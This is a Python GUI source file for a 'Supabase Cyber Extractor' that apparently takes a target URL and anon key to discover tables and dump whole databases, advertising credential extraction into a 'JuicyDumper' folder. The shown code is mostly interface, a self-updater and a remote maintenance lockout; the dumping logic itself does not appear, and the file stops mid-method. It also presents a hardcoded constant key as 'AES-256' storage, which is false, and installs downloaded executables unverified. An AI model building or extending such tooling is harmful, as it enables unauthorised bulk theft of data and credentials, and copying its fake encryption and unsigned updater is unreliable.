#!/usr/bin/env python3
"""
======================================================================
 SUPABASE CYBER EXTRACTOR & DATA IDE // v3.3 [ENCRYPTED STORAGE EDITION]
======================================================================
 Features:
  - Strict Maintenance Lockout (Overlay + Non-closable Modal)
  - GitHub Cache-Busting Maintenance Checker
  - Auto-Encrypted Storage on Disk (AES-256)
  - Seamless Decryption inside Workspace & Viewer
  - Custom Application Icon Support (.ico / .png)
  - Step-by-Step Credential Navigator & Regex Matcher
======================================================================
"""

import sys
import os
import json
import re
import time
import base64
import subprocess
import threading
import shutil
import hashlib
import tempfile
import webbrowser
from datetime import datetime
from urllib.parse import urlparse
from pathlib import Path
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import requests
from requests.exceptions import ConnectionError, Timeout, RequestException
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Encryption Library
try:
    from cryptography.fernet import Fernet
except ImportError:
    Fernet = None

# ====================================================================
# 🚀 HELPER PARA SA ASSETS / PYINSTALLER COMPILATION
# ====================================================================
def resource_path(relative_path):
    """Kinukuha ang tamang absolute path para sa dev at PyInstaller exe."""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ====================================================================
# 🔐 ENCRYPTION ENGINE (AES / FERNET)
# ====================================================================
SECRET_APP_SALT = b"SUPABASE_CYBER_EXTRACTOR_SUPER_SECRET_KEY_2026"
ENCRYPTION_KEY = base64.urlsafe_b64encode(hashlib.sha256(SECRET_APP_SALT).digest())

def encrypt_data(raw_string: str) -> str:
    """Ie-encrypt ang data bago i-save sa disk."""
    if Fernet is None:
        encoded = base64.b64encode(raw_string.encode('utf-8')).decode('utf-8')
        return f"ENC::{encoded}"
    
    cipher = Fernet(ENCRYPTION_KEY)
    encrypted = cipher.encrypt(raw_string.encode('utf-8'))
    return encrypted.decode('utf-8')

def decrypt_data(cipher_string: str) -> str:
    """Ide-decrypt ang data kapag binuksan sa loob ng Workspace viewer."""
    try:
        if cipher_string.startswith("ENC::"):
            raw_b64 = cipher_string.replace("ENC::", "")
            return base64.b64decode(raw_b64.encode('utf-8')).decode('utf-8')
        
        if Fernet is not None:
            cipher = Fernet(ENCRYPTION_KEY)
            decrypted = cipher.decrypt(cipher_string.encode('utf-8'))
            return decrypted.decode('utf-8')
    except Exception:
        pass
    return cipher_string

# ====================================================================
# 🚀 VERSION CONFIGURATION
# ====================================================================
APP_VERSION = "3.3.0"
APP_NAME = "SupabaseCyberExtractor"
GITHUB_REPO = "janperboncales/SupabaseCyberExtractor"
GITHUB_API_URL = f"https://api.github.com/repos/{GITHUB_REPO}/releases"
GITHUB_RAW_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main"

# ====================================================================
# 🎨 COLOR PALETTE & TYPOGRAPHY
# ====================================================================
BG_ROOT = "#06090a"
BG_PANEL = "#0e1418"
BG_SIDEBAR = "#0a0f12"
BG_ENTRY = "#131b20"
BG_EDITOR = "#0a0e11"
BORDER_COLOR = "#1a382b"

FG_GREEN = "#00ff66"
FG_CYAN = "#00e5ff"
FG_MUTED = "#557a6e"
FG_RED = "#ff2a5f"
FG_YELLOW = "#ffd600"
FG_WHITE = "#e6edf3"
FG_ORANGE = "#ff8c00"

HL_BG_ACTIVE = "#ff0055"
HL_FG_ACTIVE = "#ffffff"
HL_BG_PASSIVE = "#3a1d28"
HL_FG_PASSIVE = "#ff94b8"

FONT_TITLE = ("Consolas", 13, "bold")
FONT_HEADER = ("Consolas", 10, "bold")
FONT_MONO = ("Consolas", 10)
FONT_MONO_BOLD = ("Consolas", 10, "bold")
FONT_EDITOR = ("Consolas", 10)
FONT_SMALL = ("Consolas", 8)


# ====================================================================
# 🛠️ VERSION CONTROL ENGINE
# ====================================================================
class GitHubVersionManager:
    """Handles version checking and updates"""
    def __init__(self, app_path=None):
        self.app_path = app_path or sys.argv[0]
        self.app_dir = os.path.dirname(self.app_path)
        self.version_file = os.path.join(self.app_dir, "version.json")
        self.backup_dir = os.path.join(self.app_dir, "backups")
        self.maintenance_file = os.path.join(self.app_dir, "maintenance.json")
        os.makedirs(self.backup_dir, exist_ok=True)
        
    def get_current_version(self):
        return APP_VERSION
    
    def get_version_info(self):
        if os.path.exists(self.version_file):
            try:
                with open(self.version_file, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"version": APP_VERSION, "updated_at": datetime.now().isoformat()}
    
    def save_version_info(self, version, source="local"):
        info = {
            "version": version,
            "updated_at": datetime.now().isoformat(),
            "source": source,
            "previous_version": self.get_current_version()
        }
        with open(self.version_file, 'w') as f:
            json.dump(info, f, indent=2)
    
    def create_backup(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_{APP_VERSION}_{timestamp}.exe"
        backup_path = os.path.join(self.backup_dir, backup_name)
        try:
            shutil.copy2(self.app_path, backup_path)
            return backup_path
        except Exception:
            return None
    
    def get_available_backups(self):
        backups = []
        for f in os.listdir(self.backup_dir):
            if f.endswith('.exe') and f.startswith('backup_'):
                parts = f.split('_')
                if len(parts) >= 2:
                    version = parts[1]
                    filepath = os.path.join(self.backup_dir, f)
                    size = os.path.getsize(filepath)
                    mtime = os.path.getmtime(filepath)
                    backups.append({
                        "version": version,
                        "file": f,
                        "size": size,
                        "date": datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
                    })
        return sorted(backups, key=lambda x: x["date"], reverse=True)
    
    def rollback_to_version(self, version):
        backups = self.get_available_backups()
        for backup in backups:
            if version in backup["version"]:
                backup_path = os.path.join(self.backup_dir, backup["file"])
                try:
                    shutil.copy2(backup_path, self.app_path + ".new")
                    os.replace(self.app_path + ".new", self.app_path)
                    self.save_version_info(version, "rollback")
                    return True
                except Exception:
                    return False
        return False


class GitHubUpdateManager:
    """Handles background updates"""
    def __init__(self, repo=None):
        self.repo = repo or GITHUB_REPO
        self.api_url = f"https://api.github.com/repos/{repo}/releases"
        self.raw_url = f"https://raw.githubusercontent.com/{repo}/main"
        self.version_manager = GitHubVersionManager()
    
    def get_latest_release(self):
        try:
            headers = {"Cache-Control": "no-cache"}
            response = requests.get(f"{self.api_url}/latest?_t={int(time.time())}", headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except Exception:
            return None
    
    def get_all_releases(self):
        try:
            headers = {"Cache-Control": "no-cache"}
            response = requests.get(f"{self.api_url}?_t={int(time.time())}", headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json()
            return []
        except Exception:
            return []
    
    def check_maintenance_mode(self):
        """Check if maintenance mode is enabled with Cache-Busting"""
        try:
            url = f"{self.raw_url}/maintenance.json?_t={int(time.time())}"
            headers = {
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
            response = requests.get(url, headers=headers, timeout=6)
            if response.status_code == 200:
                data = response.json()
                return data.get("maintenance", False), data.get("message", "Under Maintenance")
            return False, ""
        except Exception:
            return False, ""
    
    def download_release(self, release_info):
        try:
            assets = release_info.get("assets", [])
            if not assets:
                version = release_info.get("tag_name", "").replace("v", "")
                download_url = f"{self.raw_url}/dist/SupabaseCyberExtractor_v{version}.exe"
            else:
                download_url = assets[0].get("browser_download_url")
            
            if not download_url:
                return False
            
            self.version_manager.create_backup()
            
            response = requests.get(download_url, stream=True, timeout=60)
            if response.status_code == 200:
                temp_file = os.path.join(tempfile.gettempdir(), f"{APP_NAME}_update.exe")
                with open(temp_file, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                shutil.copy2(temp_file, sys.argv[0] + ".new")
                os.replace(sys.argv[0] + ".new", sys.argv[0])
                
                version = release_info.get("tag_name", "").replace("v", "")
                self.version_manager.save_version_info(version, "update")
                return True
            return False
        except Exception:
            return False


# ====================================================================
# 🖥️ NON-CLOSABLE MAINTENANCE MODE POPUP
# ====================================================================
class MaintenancePopup(tk.Toplevel):
    """Themed maintenance mode popup that cannot be closed casually"""
    def __init__(self, parent, message="Under Maintenance", version_info=None):
        super().__init__(parent)
        self.parent = parent
        
        self.title("⛔ SYSTEM MAINTENANCE")
        self.geometry("520x440")
        self.configure(bg=BG_PANEL)
        self.resizable(False, False)
        
        # Modal setup - Locks the window and blocks background clicks
        self.transient(parent)
        
        # Center in parent window
        self.update_idletasks()
        width = 520
        height = 440
        x = parent.winfo_x() + (parent.winfo_width() // 2) - (width // 2)
        y = parent.winfo_y() + (parent.winfo_height() // 2) - (height // 2)
        self.geometry(f"{width}x{height}+{max(0, x)}+{max(0, y)}")
        
        # Bawal i-close gamit ang Alt+F4 o Window 'X'
        self.protocol("WM_DELETE_WINDOW", self.prevent_close)

        main_frame = tk.Frame(self, bg=BG_PANEL, bd=2, relief="solid", highlightbackground=BORDER_COLOR, highlightthickness=1)
        main_frame.pack(fill="both", expand=True, padx=12, pady=12)
        
        icon_label = tk.Label(main_frame, text="⛔", font=("Segoe UI", 44), fg=FG_RED, bg=BG_PANEL)
        icon_label.pack(pady=(16, 5))
        
        tk.Label(main_frame, text="SYSTEM UNDER MAINTENANCE", font=("Segoe UI", 16, "bold"), fg=FG_RED, bg=BG_PANEL).pack(pady=4)
        tk.Frame(main_frame, height=2, bg=BORDER_COLOR).pack(fill="x", padx=40, pady=8)
        
        tk.Label(
            main_frame,
            text=message,
            font=("Segoe UI", 11),
            fg=FG_WHITE,
            bg=BG_PANEL,
            wraplength=440,
            justify="center"
        ).pack(pady=8)
        
        if version_info:
            tk.Label(main_frame, text=f"Current Version: {version_info.get('current', 'Unknown')}", font=FONT_SMALL, fg=FG_MUTED, bg=BG_PANEL).pack(pady=1)
            tk.Label(main_frame, text=f"Status: {version_info.get('new', 'Checking updates...')}", font=FONT_SMALL, fg=FG_CYAN, bg=BG_PANEL).pack(pady=1)
        
        tk.Frame(main_frame, height=2, bg=BORDER_COLOR).pack(fill="x", padx=40, pady=8)
        
        self.progress = ttk.Progressbar(main_frame, mode="indeterminate", style="Cyber.Horizontal.TProgressbar")
        self.progress.pack(fill="x", padx=40, pady=8)
        self.progress.start(12)
        
        self.status_label = tk.Label(main_frame, text="Maintenance mode is currently enforced...", font=FONT_SMALL, fg=FG_YELLOW, bg=BG_PANEL)
        self.status_label.pack(pady=4)
        
        btn_frame = tk.Frame(main_frame, bg=BG_PANEL)
        btn_frame.pack(pady=10)

        # Exit application button (Only allowed exit)
        self.exit_btn = tk.Button(
            btn_frame,
            text="🚪 EXIT APP",
            command=self.force_exit_app,
            font=FONT_MONO_BOLD,
            bg=BG_ENTRY,
            fg=FG_RED,
            activebackground=FG_RED,
            activeforeground=BG_ROOT,
            bd=1,
            relief="solid",
            padx=16,
            pady=6,
            cursor="hand2"
        )
        self.exit_btn.pack(side="left", padx=5)
        
        # Enforce Focus
        self.after(100, self.grab_set)

    def prevent_close(self):
        """Harangin ang pagsasara ng window."""
        pass

    def update_status(self, text):
        self.status_label.config(text=text)
        self.update()

    def force_exit_app(self):
        """Isasara ang buong application."""
        self.progress.stop()
        self.parent.destroy()
        sys.exit(0)


# ====================================================================
# 🖥️ MAIN APPLICATION
# ====================================================================
class CyberSupabaseIDE(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title(f"SUPABASE DATA STUDIO // CYBER IDE [v{APP_VERSION}]")
        self.geometry("1200x820")
        self.minsize(1020, 700)
        self.configure(bg=BG_ROOT)

        # Custom Icon Setup
        self.load_app_icon()

        # Version Managers
        self.version_manager = GitHubVersionManager()
        self.update_manager = GitHubUpdateManager()

        # States
        self.is_running = False
        self.discovered_tables = []
        self.table_data = {}
        self.total_records = 0
        self.current_loaded_file = None
        self.overlay_frame = None
        
        self.match_ranges = []
        self.current_match_idx = -1

        self.base_dump_dir = r"C:\JuicyDumper" if os.name == 'nt' else os.path.join(os.path.expanduser("~"), "JuicyDumper")
        os.makedirs(self.base_dump_dir, exist_ok=True)

        self.setup_styles()
        self.setup_ui()
        self.setup_version_ui()
        self.refresh_file_tree()
        
        self.log_terminal(f"[*] Workspace ready. Storage: {self.base_dump_dir}", "CYAN")
        self.log_terminal(f"[*] Security: Auto-Encrypted Output Storage ENABLED [AES-256]", "GREEN")
        self.log_terminal(f"[*] Version {APP_VERSION} loaded", "GREEN")
        
        # Immediate Maintenance Check
        self.after(200, self.check_maintenance_and_updates)

    def load_app_icon(self):
        """Loads custom app icon if available"""
        try:
            for icon_name in ["supdump.ico", "app.ico", "icon.ico"]:
                path = resource_path(icon_name)
                if os.path.exists(path):
                    self.iconbitmap(path)
                    return
            for png_name in ["supdump.png", "app.png", "icon.png"]:
                path = resource_path(png_name)
                if os.path.exists(path):
                    self.iconphoto(False, tk.PhotoImage(file=path))
                    return
        except Exception:
            pass

    def setup_styles(self):
        self.style = ttk.Style(self)
        self.style.theme_use("clam")
        self.style.configure("Cyber.TNotebook", background=BG_ROOT, borderwidth=0)
        self.style.configure(
            "Cyber.TNotebook.Tab",
            background=BG_PANEL,
            foreground=FG_MUTED,
            font=FONT_HEADER,
            padding=[16, 6],
            borderwidth=1,
            bordercolor=BORDER_COLOR
        )
        self.style.map(
            "Cyber.TNotebook.Tab",
            background=[("selected", BG_ENTRY)],
            foreground=[("selected", FG_GREEN)],
            bordercolor=[("selected", FG_GREEN)]
        )
        self.style.configure(
            "Cyber.Horizontal.TProgressbar",
            troughcolor=BG_ENTRY,
            background=FG_GREEN,
            darkcolor=FG_GREEN,
            lightcolor=FG_GREEN,
            bordercolor=BORDER_COLOR,
            thickness=10
        )
        self.style.configure(
            "Cyber.Treeview",
            background=BG_SIDEBAR,
            foreground=FG_WHITE,
            fieldbackground=BG_SIDEBAR,
            font=FONT_MONO,
            rowheight=24,
            borderwidth=0
        )
        self.style.map("Cyber.Treeview", background=[("selected", BORDER_COLOR)], foreground=[("selected", FG_GREEN)])

    # ====================================================================
    # 🔒 MAINTENANCE & BLUR OVERLAY CONTROLS
    # ====================================================================
    def show_maintenance_overlay(self):
        """Tatakpan ng dark dimmed overlay ang buong interface para hindi magamit."""
        if not self.overlay_frame:
            self.overlay_frame = tk.Frame(self, bg="#040607")
            self.overlay_frame.place(relx=0, rely=0, relwidth=1, relheight=1)
            
            # Subtle background label
            lbl = tk.Label(
                self.overlay_frame,
                text="⛔ SYSTEM LOCKED — UNDER MAINTENANCE ⛔",
                font=("Consolas", 15, "bold"),
                fg=FG_RED,
                bg="#040607"
            )
            lbl.place(relx=0.5, rely=0.5, anchor="center")

    def hide_maintenance_overlay(self):
        """Aalisin ang overlay kapag hindi na maintenance."""
        if self.overlay_frame:
            self.overlay_frame.destroy()
            self.overlay_frame = None

    # ====================================================================
    # 🖥️ VERSION CONTROL UI
    # ====================================================================
    def setup_version_ui(self):
        self.version_status_label = tk.Label(
            self,
            text=f"v{APP_VERSION}",
            font=FONT_SMALL,
            fg=FG_MUTED,
            bg=BG_ROOT
        )
        self.version_status_label.place(relx=0.5, y=10, anchor="n")
    
    def create_version_menu(self, parent):
        menu_btn = tk.Menubutton(
            parent,
            text="⚙️ UPDATES",
            font=FONT_MONO_BOLD,
            bg=BG_ENTRY,
            fg=FG_CYAN,
            relief="flat",
            padx=10,
            pady=2,
            cursor="hand2"
        )
        menu_btn.pack(side="left", padx=5)
        
        menu = tk.Menu(menu_btn, tearoff=0, bg=BG_PANEL, fg=FG_WHITE, font=FONT_MONO)
        menu_btn.config(menu=menu)
        
        menu.add_command(label="📥 Check for Updates", command=self.check_updates_manual)
        menu.add_command(label="📋 View Releases", command=self.view_releases)
        menu.add_separator()
        menu.add_command(label="⬅️ Rollback to Previous", command=self.rollback_previous)
        menu.add_separator()
        menu.add_command(label="📂 Open Backup Folder", command=self.open_backup_folder)
        menu.add_separator()
        menu.add_command(label="ℹ️ About", command=self.show_about)
        
        return menu_btn

    def check_maintenance_and_updates(self):
        threading.Thread(target=self._do_maintenance_check, daemon=True).start()

    def _do_maintenance_check(self):
        try:
            maintenance, message = self.update_manager.check_maintenance_mode()
            if maintenance:
                version_info = {"current": APP_VERSION, "new": "Updating / Locked"}
                self.after(0, lambda: self._show_maintenance_lockout(message, version_info))
                return
            
            # Normal background update check
            release = self.update_manager.get_latest_release()
            if release:
                latest_version = release.get("tag_name", "").replace("v", "")
                if latest_version != APP_VERSION:
                    self.after(0, lambda: self.show_update_notification(release))
        except Exception as e:
            self.log_terminal(f"[!] Update check failed: {str(e)}", "YELLOW")

    def _show_maintenance_lockout(self, message, version_info):
        """I-lock ang main screen at ilabas ang unclosable popup."""
        self.show_maintenance_overlay()
        popup = MaintenancePopup(self, message, version_info)
        threading.Thread(target=self._download_maintenance_update, args=(popup,), daemon=True).start()

    def _download_maintenance_update(self, popup):
        try:
            release = self.update_manager.get_latest_release()
            if not release:
                popup.update_status("Maintenance mode active. No updates found.")
                return
            
            popup.update_status(f"Downloading update {release.get('tag_name')}...")
            success = self.update_manager.download_release(release)
            
            if success:
                popup.update_status("Update ready! Restarting system...")
                self.after(2000, self._restart_application)
            else:
                popup.update_status("Maintenance active. Update pending.")
        except Exception as e:
            popup.update_status("Maintenance mode active.")

    def show_update_notification(self, release_info):
        version = release_info.get("tag_name", "").replace("v", "")
        name = release_info.get("name", version)
        body = release_info.get("body", "No release notes available.")
        
        result = messagebox.askyesno(
            "🔄 Update Available",
            f"Version {version} is available!\n\n"
            f"Release: {name}\n\n"
            f"Release Notes:\n{body[:500]}{'...' if len(body) > 500 else ''}\n\n"
            f"Current: v{APP_VERSION}\n"
            f"Latest: v{version}\n\n"
            "Would you like to download and install the update now?"
        )
        if result:
            self.apply_update(release_info)

    def check_updates_manual(self):
        self.set_status("Checking for updates...", True)
        self.start_progress_indeterminate("Checking for updates...")
        threading.Thread(target=self._do_manual_check, daemon=True).start()

    def _do_manual_check(self):
        try:
            maintenance, message = self.update_manager.check_maintenance_mode()
            if maintenance:
                self.after(0, lambda: self._show_maintenance_lockout(message, {"current": APP_VERSION, "new": "Under Maintenance"}))
                return
            
            release = self.update_manager.get_latest_release()
            self.after(0, lambda: self._show_manual_check_result(release))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Error", f"Failed to check updates: {e}"))
        finally:
            self.after(0, lambda: self.stop_progress("Done"))
            self.after(0, lambda: self.set_status("Idle", False))

    def _show_manual_check_result(self, release):
        if not release:
            messagebox.showinfo("No Updates", f"Could not check for updates.\n\nCurrent: v{APP_VERSION}")
            return
        
        latest_version = release.get("tag_name", "").replace("v", "")
        if latest_version == APP_VERSION:
            messagebox.showinfo("✅ Up to Date", f"Version {APP_VERSION} is the latest version!")
            return
        self.show_update_notification(release)

    def apply_update(self, release_info):
        self.set_status("Updating...", True)
        self.start_progress_indeterminate("Downloading update...")
        threading.Thread(target=self._do_apply_update, args=(release_info,), daemon=True).start()

    def _do_apply_update(self, release_info):
        try:
            version = release_info.get("tag_name", "").replace("v", "")
            success = self.update_manager.download_release(release_info)
            if success:
                self.after(0, lambda: messagebox.showinfo(
                    "✅ Update Applied",
                    f"Successfully updated to version {version}!\n\nThe application will restart now."
                ))
                self.after(1000, self._restart_application)
            else:
                self.after(0, lambda: messagebox.showerror("Error", "Failed to apply update"))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Error", f"Update failed: {e}"))
        finally:
            self.after(0, lambda: self.stop_progress("Update Complete"))
            self.after(0, lambda: self.set_status("Idle", False))

    def view_releases(self):
        threading.Thread(target=self._do_view_releases, daemon=True).start()

    def _do_view_releases(self):
        try:
            releases = self.update_manager.get_all_releases()
            self.after(0, lambda: self._show_releases_dialog(releases))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Error", f"Failed to fetch releases: {e}"))

    def _show_releases_dialog(self, releases):
        if not releases:
            messagebox.showinfo("No Releases", "No releases found.")
            return
        
        dialog = tk.Toplevel(self)
        dialog.title("📋 System Releases")
        dialog.geometry("600x400")
        dialog.configure(bg=BG_PANEL)
        
        tk.Label(dialog, text="Available Updates & Releases", font=FONT_TITLE, fg=FG_GREEN, bg=BG_PANEL).pack(pady=10)
        
        list_frame = tk.Frame(dialog, bg=BG_PANEL)
        list_frame.pack(fill="both", expand=True, padx=20, pady=5)
        
        listbox = tk.Listbox(list_frame, bg=BG_ENTRY, fg=FG_WHITE, font=FONT_MONO, selectbackground=BORDER_COLOR)
        listbox.pack(fill="both", expand=True)
        
        for release in releases[:10]:
            version = release.get("tag_name", "Unknown")
            name = release.get("name", version)
            date = release.get("published_at", "").split("T")[0]
            prerelease = " [PRERELEASE]" if release.get("prerelease") else ""
            listbox.insert(tk.END, f"{version} - {name} ({date}){prerelease}")
        
        tk.Button(dialog, text="CLOSE", command=dialog.destroy, bg=BG_ENTRY, fg=FG_GREEN, font=FONT_MONO_BOLD, padx=20, pady=5).pack(pady=10)

    def rollback_previous(self):
        backups = self.version_manager.get_available_backups()
        if not backups:
            messagebox.showinfo("No Backups", "No backup versions available.")
            return
        
        dialog = tk.Toplevel(self)
        dialog.title("⬅️ Rollback to Previous Version")
        dialog.geometry("500x350")
        dialog.configure(bg=BG_PANEL)
        
        tk.Label(dialog, text="Select a version to rollback to:", font=FONT_HEADER, fg=FG_GREEN, bg=BG_PANEL).pack(pady=10)
        
        listbox = tk.Listbox(dialog, bg=BG_ENTRY, fg=FG_WHITE, font=FONT_MONO, selectbackground=BORDER_COLOR)
        listbox.pack(fill="both", expand=True, padx=20, pady=10)
        
        for backup in backups:
            listbox.insert(tk.END, f"v{backup['version']} - {backup['date']} ({backup['size']//1024} KB)")
        
        def do_rollback():
            selection = listbox.curselection()
            if not selection:
                return
            selected = backups[selection[0]]
            version = selected["version"]
            
            result = messagebox.askyesno(
                "Confirm Rollback",
                f"Are you sure you want to rollback to version {version}?\n\n"
                f"Current: v{APP_VERSION}\n"
                f"Target: v{version}\n\n"
                "The application will restart after rollback."
            )
            
            if result:
                success = self.version_manager.rollback_to_version(version)
                if success:
                    messagebox.showinfo("✅ Rollback Complete", f"Successfully rolled back to version {version}!\nRestarting...")
                    dialog.destroy()
                    self._restart_application()
                else:
                    messagebox.showerror("Rollback Failed", "Could not rollback to the selected version.")
        
        tk.Button(dialog, text="ROLLBACK", command=do_rollback, bg=BG_ENTRY, fg=FG_RED, font=FONT_MONO_BOLD, padx=20, pady=5).pack(pady=10)

    def open_backup_folder(self):
        try:
            if os.name == 'nt':
                os.startfile(self.version_manager.backup_dir)
            else:
                subprocess.Popen(["open" if sys.platform == 'darwin' else "xdg-open", self.version_manager.backup_dir])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open folder: {e}")

    def show_about(self):
        messagebox.showinfo(
            "About",
            f"{APP_NAME} v{APP_VERSION}\n\n"
            "Supabase Cyber Extractor & Data IDE\n\n"
            "Features:\n"
            "• Auto-Encrypted local storage\n"
            "• Auto-updates & Maintenance support\n"
            "• Version rollback\n"
            "• Credential extraction\n"
            "• Data dumping\n"
            "• Built-in code viewer\n\n"
            f"Backup Location: {self.version_manager.backup_dir}"
        )

    def _restart_application(self):
        python = sys.executable
        os.execl(python, python, *sys.argv)

    # ====================================================================
    # 🖥️ CORE UI SETUP
    # ====================================================================
    def setup_ui(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        top_bar = tk.Frame(self, bg=BG_ROOT, pady=6, padx=15)
        top_bar.grid(row=0, column=0, sticky="ew")

        tk.Label(top_bar, text="⚡ SUPABASE DATA STUDIO // CYBER IDE", font=FONT_TITLE, fg=FG_GREEN, bg=BG_ROOT).pack(side="left")
        self.create_version_menu(top_bar)
        
        self.lbl_workspace = tk.Label(top_bar, text=f"DIR: {self.base_dump_dir}", font=FONT_SMALL, fg=FG_MUTED, bg=BG_ROOT)
        self.lbl_workspace.pack(side="right", pady=4)

        self.notebook = ttk.Notebook(self, style="Cyber.TNotebook")
        self.notebook.grid(row=1, column=0, sticky="nsew", padx=12, pady=(0, 6))

        self.tab_extractor = tk.Frame(self.notebook, bg=BG_ROOT)
        self.tab_viewer = tk.Frame(self.notebook, bg=BG_ROOT)

        self.notebook.add(self.tab_extractor, text="  ⚡ EXTRACTOR ENGINE  ")
        self.notebook.add(self.tab_viewer, text="  📁 WORKSPACE & VIEWER  ")

        self.build_extractor_tab()
        self.build_viewer_tab()

        footer = tk.Frame(self, bg=BG_ROOT, pady=4, padx=15)
        footer.grid(row=2, column=0, sticky="ew")

        self.lbl_status = tk.Label(footer, text="SYSTEM READY", font=FONT_SMALL, fg=FG_MUTED, bg=BG_ROOT)
        self.lbl_status.pack(side="left")

        self.lbl_stats = tk.Label(footer, text="Tables: 0 | Records: 0", font=FONT_MONO_BOLD, fg=FG_GREEN, bg=BG_ROOT)
        self.lbl_stats.pack(side="right")

    # ====================================================================
    # ⚡ TAB 1: EXTRACTOR ENGINE
    # ====================================================================
    def build_extractor_tab(self):
        self.tab_extractor.grid_columnconfigure(0, weight=1)
        self.tab_extractor.grid_rowconfigure(1, weight=1)

        config_frame = tk.LabelFrame(
            self.tab_extractor,
            text=" [ 🎯 TARGET ENDPOINT CONFIGURATION ] ",
            font=FONT_HEADER,
            fg=FG_GREEN,
            bg=BG_PANEL,
            bd=1,
            relief="solid",
            padx=12,
            pady=10
        )
        config_frame.grid(row=0, column=0, sticky="ew", padx=8, pady=8)
        config_frame.grid_columnconfigure(1, weight=1)

        tk.Label(config_frame, text="TARGET URL:", font=FONT_MONO_BOLD, fg=FG_GREEN, bg=BG_PANEL).grid(row=0, column=0, sticky="w", pady=3)
        self.url_entry = tk.Entry(config_frame, font=FONT_MONO, fg=FG_GREEN, bg=BG_ENTRY, insertbackground=FG_GREEN, relief="flat", bd=4)
        self.url_entry.grid(row=0, column=1, sticky="ew", padx=8, pady=3)

        tk.Label(config_frame, text="API/ANON KEY:", font=FONT_MONO_BOLD, fg=FG_GREEN, bg=BG_PANEL).grid(row=1, column=0, sticky="w", pady=3)
        self.key_entry = tk.Entry(config_frame, font=FONT_MONO, fg=FG_GREEN, bg=BG_ENTRY, insertbackground=FG_GREEN, relief="flat", bd=4)
        self.key_entry.grid(row=1, column=1, sticky="ew", padx=8, pady=3)

        action_row = tk.Frame(config_frame, bg=BG_PANEL)
        action_row.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(8, 0))

        tk.Label(action_row, text="RECORD LIMIT:", font=FONT_MONO_BOLD, fg=FG_GREEN, bg=BG_PANEL).pack(side="left")
        self.limit_combo = ttk.Combobox(action_row, values=["10", "100", "500", "1000", "ALL (1000000)"], width=14, state="readonly", font=FONT_MONO)
        self.limit_combo.set("ALL (1000000)")
        self.limit_combo.pack(side="left", padx=8)

        self.btn_test = self.create_flat_btn(action_row, "TEST LINK", self.start_test_thread, FG_CYAN)
        self.btn_test.pack(side="left", padx=3)

        self.btn_discover = self.create_flat_btn(action_row, "DISCOVER TABLES", self.start_discover_thread, FG_YELLOW)
        self.btn_discover.pack(side="left", padx=3)

        self.btn_dump = self.create_flat_btn(action_row, "DUMP DATABASE", self.start_dump_thread, FG_GREEN)
        self.btn_dump.pack(side="left", padx=3)

        split_area = tk.Frame(self.tab_extractor, bg=BG_ROOT)
        split_area.grid(row=1, column=0, sticky="nsew", padx=8, pady=4)
        split_area.grid_columnconfigure(0, weight=1)
        split_area.grid_columnconfigure(1, weight=3)
        split_area.grid_rowconfigure(0, weight=1)

        tbl_frame = tk.LabelFrame(split_area, text=" [ 📂 ACCESSIBLE TABLES ] ", font=FONT_HEADER, fg=FG_GREEN, bg=BG_PANEL, bd=1, relief="solid", padx=6, pady=6)
        tbl_frame.grid(row=0, column=0, sticky="nsew", padx=(0, 4))
        tbl_frame.grid_rowconfigure(0, weight=1)
        tbl_frame.grid_columnconfigure(0, weight=1)

        self.table_listbox = tk.Listbox(tbl_frame, bg=BG_ENTRY, fg=FG_CYAN, font=FONT_MONO, selectbackground=BORDER_COLOR, selectforeground="#fff", relief="flat")
        self.table_listbox.grid(row=0, column=0, sticky="nsew")

        term_frame = tk.LabelFrame(split_area, text=" [ 📟 EXTRACTOR TERMINAL ] ", font=FONT_HEADER, fg=FG_GREEN, bg=BG_PANEL, bd=1, relief="solid", padx=6, pady=6)
        term_frame.grid(row=0, column=1, sticky="nsew", padx=(4, 0))
        term_frame.grid_rowconfigure(0, weight=1)
        term_frame.grid_columnconfigure(0, weight=1)

        self.log_text = tk.Text(term_frame, bg=BG_EDITOR, fg=FG_GREEN, font=FONT_MONO, wrap="word", relief="flat", bd=2)
        self.log_text.grid(row=0, column=0, sticky="nsew")

        self.log_text.tag_config("GREEN", foreground=FG_GREEN)
        self.log_text.tag_config("RED", foreground=FG_RED)
        self.log_text.tag_config("YELLOW", foreground=FG_YELLOW)
        self.log_text.tag_config("CYAN", foreground=FG_CYAN)
        self.log_text.tag_config("MUTED", foreground=FG_MUTED)

        prog_frame = tk.Frame(self.tab_extractor, bg=BG_ROOT, pady=4, padx=8)
        prog_frame.grid(row=2, column=0, sticky="ew")

        self.lbl_progress_text = tk.Label(prog_frame, text="IDLE", font=FONT_SMALL, fg=FG_MUTED, bg=BG_ROOT)
        self.lbl_progress_text.pack(side="left")

        self.progress_bar = ttk.Progressbar(prog_frame, orient="horizontal", mode="indeterminate", style="Cyber.Horizontal.TProgressbar")
        self.progress_bar.pack(side="right", fill="x", expand=True, padx=(10, 0))

    # ====================================================================
    # 📁 TAB 2: WORKSPACE & VIEWER (WITH AUTO-DECRYPTION)
    # ====================================================================
    def build_viewer_tab(self):
        self.tab_viewer.grid_columnconfigure(1, weight=1)
        self.tab_viewer.grid_rowconfigure(0, weight=1)

        sidebar = tk.Frame(self.tab_viewer, bg=BG_SIDEBAR, width=280, bd=1, relief="solid")
        sidebar.grid(row=0, column=0, sticky="nsew", padx=(6, 4), pady=6)
        sidebar.grid_propagate(False)
